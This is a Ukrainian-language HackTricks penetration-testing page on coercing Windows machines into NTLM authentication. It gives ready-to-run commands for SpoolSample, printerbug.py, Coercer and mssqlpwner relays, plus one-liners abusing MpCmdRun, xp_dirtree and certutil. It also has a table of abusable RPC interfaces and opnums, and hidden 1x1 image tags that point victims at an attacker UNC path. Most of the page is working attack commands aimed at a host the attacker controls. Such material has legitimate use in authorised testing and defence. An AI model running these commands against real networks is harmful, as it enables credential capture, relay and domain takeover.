# Примусова привілейована автентифікація NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) — це **колекція** **тригерів віддаленої автентифікації**, написаних на C# за допомогою компілятора MIDL для уникнення залежностей від сторонніх компонентів.

## Зловживання службою Spooler

Якщо службу _**Print Spooler**_ **увімкнено,** можна використати вже відомі облікові дані AD, щоб **запросити** у сервера друку контролера домену **оновлення** щодо нових завдань друку, а потім вказати йому **надіслати сповіщення до певної системи**.\
Зверніть увагу: коли принтер надсилає сповіщення довільній системі, йому потрібно **автентифікуватися на** цій **системі**. Отже, зловмисник може змусити службу _**Print Spooler**_ автентифікуватися на довільній системі, і під час цієї автентифікації служба **використає обліковий запис комп’ютера**.

На внутрішньому рівні класична примітива **PrinterBug** зловживає **`RpcRemoteFindFirstPrinterChangeNotificationEx`** через **`\\PIPE\\spoolss`**. Спочатку зловмисник відкриває дескриптор принтера/сервера, а потім передає підроблене ім’я клієнта в `pszLocalMachine`, щоб цільовий spooler створив канал сповіщень **у напрямку хоста під контролем зловмисника**. Саме тому результатом є **примусова вихідна автентифікація**, а не безпосереднє виконання коду.<sup>[[2]](#references)</sup>\
Якщо ви шукаєте **RCE/LPE** у самому spooler, перегляньте [PrintNightmare](printnightmare.md). Ця сторінка присвячена **примусовій автентифікації та relay**.

### Пошук Windows-серверів у домені

Використовуйте PowerShell, щоб отримати список Windows-хостів. Сервери зазвичай є пріоритетними цілями, тому спочатку зосередьтеся на них:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Виявлення служб Spooler, що прослуховують

За допомогою дещо зміненого [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) від @mysmartlogin (Vincent Le Toux) перевірте, чи прослуховує служба Spooler:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ви також можете використовувати `rpcdump.py` у Linux і шукати протокол **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Або швидко перевірити хости з Linux за допомогою **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Якщо ви хочете **перерахувати поверхні coercion**, а не лише перевірити, чи існує кінцева точка spooler, використовуйте **режим сканування Coercer**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Це корисно, оскільки перегляд endpoint в EPM лише показує, що print RPC interface зареєстровано. Це **не** гарантує, що кожен coercion method доступний із вашими поточними привілеями або що host створить придатний authentication flow.

### Попросити service автентифікуватися на довільному host

Ви можете скомпілювати [SpoolSample звідси](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
або використайте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви працюєте в Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
За допомогою **Coercer** можна безпосередньо націлитися на інтерфейси spooler і уникнути припущень щодо того, який метод RPC доступний:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Примусове використання HTTP замість SMB через WebClient

Класичний PrinterBug зазвичай спричиняє **SMB**-автентифікацію до `\\attacker\share`, що все ще корисно для **capture**, **relay до HTTP-цілей** або **relay**, якщо підписування SMB відсутнє.\
Однак у сучасних середовищах **relay SMB до SMB** часто блокується через **підписування SMB**, тому оператори часто надають перевагу примусовій автентифікації через **HTTP/WebDAV**.

Якщо на цілі запущено службу **WebClient**, listener можна вказати у формі, яка змусить Windows використовувати **WebDAV через HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Це особливо корисно під час ланцюжкового використання з **`ntlmrelayx --adcs`** або іншими HTTP relay targets, оскільки дає змогу не покладатися на можливість SMB relay у примусово встановленому з'єднанні. Важливе застереження: для роботи HTTP/WebDAV-варіанта на victim має бути запущено **WebClient**.

### Поєднання з Unconstrained Delegation

Якщо attacker скомпрометував computer, налаштований для [Unconstrained Delegation](unconstrained-delegation.md), він може **примусити printer автентифікуватися до цього computer**. Після цього **TGT** computer account printer кешується в пам'яті на хості з unconstrained delegation, де attacker може отримати його та повторно використати за допомогою [Pass the Ticket](pass-the-ticket.md).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Матриця RPC UNC-path coercion (інтерфейси/opnums, що ініціюють outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: асинхронний print interface у тому самому spooler pipe; використовуйте Coercer для переліку доступних methods на вказаному host<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (також через \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Примітка: ці methods приймають параметри, які можуть містити UNC path (наприклад, `\\attacker\share`). Під час обробки Windows автентифікується (у контексті machine/user) до цього UNC, що дає змогу виконати NetNTLM capture або relay.\
Для spooler abuse **MS-RPRN opnum 65** залишається найпоширенішою та найкраще задокументованою primitive, оскільки специфікація протоколу явно зазначає, що server створює notification channel назад до client, вказаного в `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN через \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target намагається відкрити вказаний backup log path і автентифікується до UNC, контрольованого attacker.<sup>[[1]](#references)</sup>
- Practical use: примусити Tier 0 assets (DC/RODC/Citrix тощо) передати NetNTLM, а потім виконати relay до AD CS endpoints (сценарії ESC8/ESC11) або інших privileged services.<sup>[[1]](#references)</sup>

## PrivExchange

Атака `PrivExchange` є результатом уразливості у **feature `PushSubscription` в Exchange Server**. Ця feature дає змогу будь-якому domain user із mailbox примусити Exchange server автентифікуватися до будь-якого host, наданого client, через HTTP.

За замовчуванням **Exchange service працює як SYSTEM** і має надмірні privileges (зокрема, **WriteDacl privileges на domain до Cumulative Update 2019**). Цю уразливість можна використати для **relay інформації до LDAP, а потім вилучення domain NTDS database**. Якщо relay до LDAP неможливий, цю уразливість все одно можна використати для relay та автентифікації до інших hosts у domain. Успішна експлуатація цієї атаки надає негайний доступ до Domain Admin за допомогою будь-якого автентифікованого domain user account.

## Inside Windows

Якщо ви вже перебуваєте всередині Windows machine, можна примусити Windows підключитися до server, використовуючи privileged accounts, за допомогою:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Або використайте цю іншу техніку: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Можна використати certutil.exe lolbin (двійковий файл із підписом Microsoft), щоб примусово ініціювати NTLM-аутентифікацію:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Через email

Якщо ви знаєте **email address** користувача, який входить до системи на машині, яку ви хочете скомпрометувати, ви можете просто надіслати йому **email із зображенням розміром 1x1**, наприклад як
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Коли жертва відкриває його, Windows намагається пройти автентифікацію.

### MitM

Якщо ви можете виконати атаку MitM і впровадити HTML-код у сторінку, яку переглядає жертва, спробуйте впровадити зображення, наприклад:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Інші способи примусово ініціювати та виманити NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Злам NTLMv1

Якщо ви можете перехопити [виклики NTLMv1, прочитайте тут, як їх зламати](../ntlm/index.html#ntlmv1-attack).\
_Пам’ятайте, що для злому NTLMv1 потрібно встановити Responder challenge на "1122334455667788"_

## References

- [1] [Unit 42 – Authentication Coercion продовжує розвиватися](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: протокол віддаленого доступу до журналу подій](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – методи windows-coerced-authentication](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
